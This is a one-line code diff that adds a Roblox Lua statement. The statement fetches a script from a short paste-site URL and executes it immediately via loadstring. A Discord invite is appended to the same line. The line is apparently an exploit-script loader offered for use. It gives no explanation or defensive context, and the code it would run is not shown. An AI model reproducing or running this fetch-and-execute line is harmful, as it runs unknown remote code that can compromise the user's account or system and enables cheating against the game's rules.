@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://shz.al/bTKk'),true))()https://discord.gg/n72xPp8Q5S
